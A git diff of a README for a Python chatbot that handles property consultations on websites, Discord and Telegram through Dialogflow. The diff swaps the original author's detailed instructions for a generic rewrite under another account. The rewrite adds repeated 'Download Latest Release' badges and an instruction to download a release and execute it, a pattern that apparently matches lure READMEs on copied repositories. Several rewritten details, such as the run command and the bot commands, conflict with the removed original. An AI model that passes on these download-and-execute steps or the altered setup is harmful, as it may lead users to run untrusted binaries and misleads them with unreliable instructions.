@@ -1,121 +1,127 @@
-# Kianoland Group ChattBot AI 🤖
+# Kianoland Group ChatBot AI 🤖🏡
 
-A multi-platform chatbot for property consultations, integrated with Any Website Discord and Telegram using Dialogflow ES for natural language processing.
+![Kianoland ChatBot](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue?style=for-the-badge&logo=github&logoColor=white)
 
-## Features ✨
+Welcome to the Kianoland Group ChatBot AI repository! This project aims to create a multi-platform chatbot that assists users with property consultations. It integrates seamlessly with Any Website, Discord, and Telegram, utilizing Dialogflow ES for natural language processing. 
 
-- **Multi-platform support**: Website, Discord and Telegram
-- **Natural Language Processing**: Powered by Dialogflow ES
-- **Dedicated channels**: Keeps bot interactions organized
-- **Thread isolation**: Private consultations in separate threads
+## Table of Contents
 
-## Setup Instructions 🛠️
+- [Introduction](#introduction)
+- [Features](#features)
+- [Technologies Used](#technologies-used)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Links](#links)
 
-### Prerequisites
+## Introduction
 
-- Python 3.8+
-- Discord Bot Token
-- Telegram Bot Token
-- Google Cloud Service Account JSON
+The Kianoland Group ChatBot AI is designed to enhance customer support in the real estate sector. With the rise of digital communication, having an intelligent assistant can significantly improve user experience. This chatbot can handle inquiries about properties, provide information, and assist in booking consultations.
 
-### Installation
+## Features
 
-Clone the repository:
+- **Multi-Platform Support**: Works on Any Website, Discord, and Telegram.
+- **Natural Language Processing**: Uses Dialogflow ES for understanding user queries.
+- **Real-Time Responses**: Offers quick replies to enhance user interaction.
+- **User-Friendly Interface**: Easy to use for both developers and end-users.
+- **Customizable Intents**: Tailor the bot's responses based on user needs.
+- **Webhook Integration**: Connects with various APIs for enhanced functionality.
 
-```bash
-git clone https://github.com/fatonyahmadfauzi/Kianoland-Group-ChattBot-AI.git
-cd Kianoland-Group-ChattBot-AI
-```
+## Technologies Used
 
-## Setup Instructions 🛠️
+- **Python**: The core programming language for backend development.
+- **FastAPI**: A modern web framework for building APIs.
+- **Dialogflow**: For natural language understanding.
+- **Google Cloud**: Hosting and additional services.
+- **Discord API**: For integrating with Discord.
+- **Telegram API**: For integrating with Telegram.
+- **REST API**: To facilitate communication between different platforms.
 
-### Backend Setup
+## Installation
 
-1. Navigate to backend folder:
+To set up the Kianoland Group ChatBot AI on your local machine, follow these steps:
+
+1. **Clone the Repository**:
+
    ```bash
-   cd backend
+   git clone https://github.com/malizmenezes/Kianoland-Group-ChattBot-AI.git
+   cd Kianoland-Group-ChattBot-AI
    ```
-2. Create and activate virtual environment:
-   ```bash
-   python -m venv venv
-   source venv/bin/activate  # Linux/Mac
-   venv\Scripts\activate     # Windows   cd Kianoland-Group-ChattBot-AI
-   ```
-3. Install dependencies:
+
+2. **Install Dependencies**:
+
+   Use pip to install the required libraries:
+
    ```bash
    pip install -r requirements.txt
    ```
-4. Create `.env` file:
+
+3. **Configure Environment Variables**:
+
+   Create a `.env` file in the root directory and add your API keys and other configurations.
+
+4. **Run the Application**:
+
+   Start the FastAPI server:
+
    ```bash
-   cp .env.example .env
+   uvicorn main:app --reload
    ```
-   Then edit `.env` with your credentials.
 
-### Configuration
+5. **Access the ChatBot**:
 
-Fill in your `.env` file:
+   Open your browser and navigate to `http://localhost:8000/docs` to see the API documentation and test the endpoints.
 
-```env
-DISCORD_TOKEN=your_discord_token_here
-TELEGRAM_TOKEN=your_telegram_token_here
-TELEGRAM_WEBHOOK_URL=your_url/telegram-webhook
-DIALOGFLOW_PROJECT_ID=your_project_id
-DEDICATED_CHANNEL_ID=your_channel_id
-GOOGLE_APPLICATION_CREDENTIALS=service-account.json
-```
+## Usage
 
-### Frontend Setup
+Once the chatbot is running, you can interact with it through the integrated platforms. Here’s how to use it on each platform:
 
-1. Open `frontend/index.html` in your browser
-2. No additional setup required for static files
+### On Any Website
 
-### Running the Bot
+- Embed the chatbot using an iframe or JavaScript snippet.
+- Ensure your server can handle incoming requests.
 
-```bash
-uvicorn app:app --reload --port 8000
-```
+### On Discord
 
-## Project Structure 📁
+- Add the bot to your server using the OAuth2 link.
+- Use commands to interact with the bot, such as `!property` to inquire about listings.
 
-```bash
-Kianoland-Group-ChattBot-AI
-├── backend/
-│   ├── __pycache__
-│   ├── __init__.py
-│   ├── app.py                    # Main FastAPI application
-│   ├── dialogflow_integration.py # Dialogflow integration
-│   ├── requirements.txt          # Python dependencies
-│   └── service-account.json      # Google Cloud credentials
-├── frontend/
-│   ├── index.html                # Main HTML file
-│   ├── script.js                 # Frontend JavaScript
-│   └── style.css                 # CSS styles
-├── __init__.py
-├── .env                          # Environment
-├── app.py                        # Main application
-├── .gitignore
-├── LICENSE
-└── README.md                     # This file
-```
+### On Telegram
 
-## Bot Commands 🤖
+- Search for your bot in Telegram and start a chat.
+- Use commands like `/start` to initiate the conversation.
 
-### Discord
+## Contributing
 
-- `!info` - Get property information
-- `!konsul [question]` - Start private consultation
-- Mention bot in other channels to get redirected
+We welcome contributions to improve the Kianoland Group ChatBot AI. If you have suggestions or features you'd like to see, please follow these steps:
 
-### Telegram & Website
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes and commit them (`git commit -m 'Add some feature'`).
+4. Push to the branch (`git push origin feature/YourFeature`).
+5. Open a pull request.
 
-Just send messages normally
+## License
 
-## Troubleshooting 🔧
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-- **Privileged Intents Error**: Enable intents in [Discord Developer Portal](https://discord.com/developers)
-- **Dialogflow Authentication**: Ensure `service-account.json` is in root directory
-- **Port Conflicts**: Change port in run command if 8000 is occupied
+## Contact
 
-## License 📄
+For any inquiries or issues, please reach out to the project maintainers:
 
-This project is licensed under the MIT License.
+- **Email**: [your-email@example.com](mailto:your-email@example.com)
+- **GitHub**: [malizmenezes](https://github.com/malizmenezes)
+
+## Links
+
+For the latest releases, visit [Releases](https://github.com/malizmenezes/Kianoland-Group-ChattBot-AI/releases). Download the latest version and execute it to explore all the features.
+
+![Kianoland ChatBot](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue?style=for-the-badge&logo=github&logoColor=white)
+
+Feel free to check the "Releases" section for updates and new features.
+
+---
+
+This repository aims to provide a robust solution for property consultations, ensuring that users have access to the information they need, when they need it. Your feedback and contributions are vital for the continuous improvement of this project. Thank you for your interest in Kianoland Group ChatBot AI!
